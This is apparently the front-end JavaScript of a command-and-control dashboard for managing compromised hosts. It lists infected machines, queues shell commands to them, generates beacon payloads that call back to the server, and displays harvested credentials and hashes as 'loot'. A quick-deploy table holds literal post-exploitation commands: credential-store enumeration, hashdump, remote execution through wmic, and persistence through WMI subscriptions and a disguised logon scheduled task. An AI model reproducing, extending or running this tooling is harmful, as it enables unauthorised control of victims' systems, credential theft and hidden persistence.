
async function loadStats() {
    try {
        const res = await fetch('/c2/stats');
        const data = await res.json();
        if (data.success) {
            document.getElementById('agentCount').textContent = data.stats.active || 0;
            // Update other stats if elements exist
            const dormantEl = document.getElementById('dormantCount');
            if (dormantEl) dormantEl.textContent = data.stats.dormant || 0;
        }
    } catch(e) { console.error('loadStats:', e); }
}

async function refreshBeacons() {
    try {
        const res = await fetch('/c2/beacons');
        const data = await res.json();
        document.getElementById('agentCount').textContent = data.beacons?.filter(b => b.status === 'active').length || 0;
        
        // Update agents table
        const tbody = document.getElementById('agentsTable');
        if (tbody && data.beacons?.length) {
            tbody.innerHTML = data.beacons.map(beacon => `
                <tr>
                    <td><span style="font-family: monospace; color: var(--accent-purple);">${beacon.id?.substring(0,8) || 'N/A'}</span></td>
                    <td>${beacon.hostname || 'Unknown'}</td>
                    <td>${beacon.username || '-'}</td>
                    <td>${beacon.ip_internal || beacon.ip_external || '-'}</td>
                    <td>${beacon.os || '-'}</td>
                    <td><span class="badge-status badge-${beacon.status || 'unknown'}">${beacon.status || 'unknown'}</span></td>
                    <td>${beacon.last_seen || '-'}</td>
                    <td>
                        <button class="btn-ghost btn-sm" onclick="interactAgent('${beacon.id}')"><i class="bi bi-terminal"></i></button>
                        <button class="btn-ghost btn-sm" onclick="killAgent('${beacon.id}')"><i class="bi bi-x-circle text-danger"></i></button>
                    </td>
                </tr>
            `).join('');
        } else if (tbody) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="8" class="text-center" style="padding: 3rem; color: var(--text-muted);">
                        <i class="bi bi-cpu" style="font-size: 2rem; opacity: 0.3;"></i>
                        <p class="mt-2 mb-0">No active beacons. Deploy an agent to get started.</p>
                    </td>
                </tr>
            `;
        }
    } catch(e) { console.error('refreshBeacons:', e); }
}

async function createListener() {
    const data = {
        name: document.getElementById('listenerName').value,
        type: document.getElementById('listenerType').value,
        host: document.getElementById('listenerHost').value,
        port: document.getElementById('listenerPort').value
    };
    try {
        const res = await fetch('/c2/listeners', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
        const result = await res.json();
        if (result.success) { location.reload(); }
        else { alert('Error: ' + result.error); }
    } catch(e) { alert('Error: ' + e); }
}

async function startListener(id) { await fetch('/c2/listeners/' + id + '/start', { method: 'POST' }); location.reload(); }
async function stopListener(id) { await fetch('/c2/listeners/' + id + '/stop', { method: 'POST' }); location.reload(); }
async function deleteListener(id) { if(confirm('Delete?')) { await fetch('/c2/listeners/' + id, { method: 'DELETE' }); location.reload(); }}

function interactAgent(id) {
    currentAgentId = id;
    new bootstrap.Modal(document.getElementById('agentModal')).show();
    loadAgentTasks(id);
}

async function loadAgentTasks(id) {
    try {
        const res = await fetch('/c2/tasks?beacon_id=' + id);
        const data = await res.json();
        const el = document.getElementById('agentTaskHistory');
        if (data.tasks?.length) {
            el.innerHTML = data.tasks.map(t => 
                '<div style="padding: 0.75rem; background: var(--bg-dark); border-radius: 8px; margin-bottom: 0.5rem;">' +
                '<code style="color: var(--accent-purple);">' + t.command + ' ' + (t.args||[]).join(' ') + '</code>' +
                ' <span class="badge-status badge-' + t.status + '">' + t.status + '</span>' +
                (t.output ? '<pre style="margin-top: 0.5rem; color: var(--accent-green); font-size: 0.8rem; max-height: 150px; overflow: auto;">' + escapeHtml(t.output || '') + '</pre>' : '') +
                '</div>'
            ).join('');
        } else { el.innerHTML = '<p style="color: var(--text-muted);">No tasks yet.</p>'; }
    } catch(e) { console.error(e); }
}

async function sendTask() {
    try {
        const args = document.getElementById('taskArgs').value.trim();
        const res = await fetch('/c2/beacons/' + currentAgentId + '/task', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                command: document.getElementById('taskCommand').value,
                args: args ? args.split(' ') : []
            })
        });
        const data = await res.json();
        if (data.success) { 
            loadAgentTasks(currentAgentId); 
            document.getElementById('taskArgs').value = ''; 
            // Show success feedback
            const btn = document.querySelector('#agentModal .btn-c2');
            if (btn) {
                const originalText = btn.innerHTML;
                btn.innerHTML = '<i class="bi bi-check"></i> Queued!';
                btn.style.background = 'var(--accent-green)';
                setTimeout(() => { btn.innerHTML = originalText; btn.style.background = ''; }, 1500);
            }
        }
        else { alert('Error: ' + (data.error || 'Unknown error')); }
    } catch(e) { alert('Error: ' + e); }
}

async function killAgent(id) {
    if(confirm('Kill this beacon? This will send an exit command.')) {
        await fetch('/c2/beacons/' + id + '/kill', { method: 'POST' });
        refreshBeacons();
    }
}

async function generatePayload() {
    const output = document.getElementById('payloadOutput');
    output.innerHTML = '<span class="pulse" style="color: var(--accent-yellow);"># Generating payload...</span>';
    try {
        const payloadType = document.getElementById('payloadType').value;
        const sleep = parseInt(document.getElementById('payloadSleep').value) || 30;
        const jitter = parseInt(document.getElementById('payloadJitter').value) || 10;
        
        const res = await fetch('/c2/payloads/generate', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: payloadType,
                c2_url: window.location.origin + '/c2/beacon',
                options: {
                    sleep: sleep,
                    jitter: jitter
                }
            })
        });
        const data = await res.json();
        if (data.success && data.payload) {
            generatedPayload = data.payload;
            output.innerHTML = '<pre style="margin: 0; white-space: pre-wrap; max-height: 400px; overflow: auto;">' + escapeHtml(data.payload) + '</pre>';
        } else {
            output.innerHTML = '<span style="color: var(--accent-red);"># Error: ' + (data.error || 'Unknown error') + '</span>';
        }
    } catch(e) {
        output.innerHTML = '<span style="color: var(--accent-red);"># Error: ' + e + '</span>';
    }
}

function copyPayload() {
    if(generatedPayload) {
        navigator.clipboard.writeText(generatedPayload).then(() => {
            const btn = document.querySelector('[onclick="copyPayload()"]');
            if (btn) {
                const orig = btn.innerHTML;
                btn.innerHTML = '<i class="bi bi-check"></i> Copied!';
                setTimeout(() => btn.innerHTML = orig, 1500);
            }
        });
    }
}

function downloadPayload() {
    if(!generatedPayload) return;
    const type = document.getElementById('payloadType').value;
    const extMap = {
        'python': 'py', 'python_oneliner': 'txt',
        'powershell': 'ps1', 'powershell_encoded': 'txt',
        'bash': 'sh', 'php': 'php'
    };
    const ext = extMap[type] || 'txt';
    const blob = new Blob([generatedPayload], {type: 'text/plain'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'beacon_' + type + '.' + ext;
    a.click();
}

async function loadLoot() {
    try {
        const res = await fetch('/c2/loot');
        const data = await res.json();
        const tbody = document.getElementById('credsTable');
        if (tbody && data.loot?.length) {
            tbody.innerHTML = data.loot.map(l => `
                <tr>
                    <td><span class="badge-status badge-info">${l.type || 'unknown'}</span></td>
                    <td>${l.domain || '-'}</td>
                    <td><code>${l.username || '-'}</code></td>
                    <td><code style="color: var(--accent-green);">${l.value || l.hash || '-'}</code></td>
                    <td>${l.source || 'beacon'}</td>
                </tr>
            `).join('');
        }
    } catch(e) { console.error('loadLoot:', e); }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function showOutput(taskId) {
    alert('Task ID: ' + taskId);
}

// Cross-Module Integration Functions
function openDllSideload() { window.open('/dll-sideload', '_blank'); }
function openWmiPersistence() { window.open('/wmi-persistence', '_blank'); }
function openLateralMovement() { window.open('/lateral', '_blank'); }
function openSupplyChain() { window.open('/supply-chain', '_blank'); }
function openGoldenTicket() { window.open('/golden-ticket', '_blank'); }
function openDpapiExtractor() { window.open('/dpapi-extractor', '_blank'); }

async function quickDeploy() {
    const agentId = document.getElementById('deployAgent').value;
    const module = document.getElementById('deployModule').value;
    
    if (!agentId || !module) {
        alert('Please select both an agent and a module');
        return;
    }
    
    const moduleCommands = {
        'dpapi': {command: 'shell', args: 'powershell -c "Get-ChildItem C:\\Users\\*\\AppData\\*\\Microsoft\\Credentials\\*"'},
        'hashdump': {command: 'hashdump', args: ''},
        'lateral_smb': {command: 'shell', args: 'net view /all'},
        'lateral_wmi': {command: 'shell', args: 'wmic /node:"{target}" process call create "cmd /c whoami"'},
        'persist_wmi': {command: 'shell', args: 'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE'},
        'persist_schtask': {command: 'shell', args: 'schtasks /create /tn "SystemHealth" /tr "cmd /c {payload}" /sc onlogon'},
        'privesc': {command: 'shell', args: 'whoami /priv && whoami /groups'}
    };
    
    const cmd = moduleCommands[module];
    if (!cmd) return;
    
    try {
        const res = await fetch('/c2/beacons/' + agentId + '/task', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({command: cmd.command, args: cmd.args})
        });
        const data = await res.json();
        if (data.success) {
            alert('Module deployed successfully! Check Tasks tab for results.');
        } else {
            alert('Error: ' + (data.error || 'Unknown error'));
        }
    } catch(e) {
        alert('Error: ' + e);
    }
}

// Auto refresh every 15 seconds
setInterval(() => {
    refreshBeacons();
    loadStats();
}, 15000);
</script>
{% endblock %}
